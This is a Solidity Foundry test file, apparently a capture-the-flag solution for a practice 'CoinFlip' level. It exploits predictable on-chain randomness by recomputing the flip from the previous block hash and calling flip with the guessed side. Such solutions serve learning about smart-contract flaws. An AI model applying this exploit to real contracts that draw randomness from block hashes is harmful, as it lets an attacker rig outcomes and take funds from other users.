// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import "../src/level3.sol";
import "@openzeppelin/contracts/math/SafeMath.sol";

contract POC is Test {
    using SafeMath for uint256;
    CoinFlip level3 = new CoinFlip();

    function test() external {
        vm.startBroadcast();

        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        require(level3.flip(side));

        console.log("Consecutive Wins: ", level3.consecutiveWins());

        vm.stopBroadcast();
    }
}
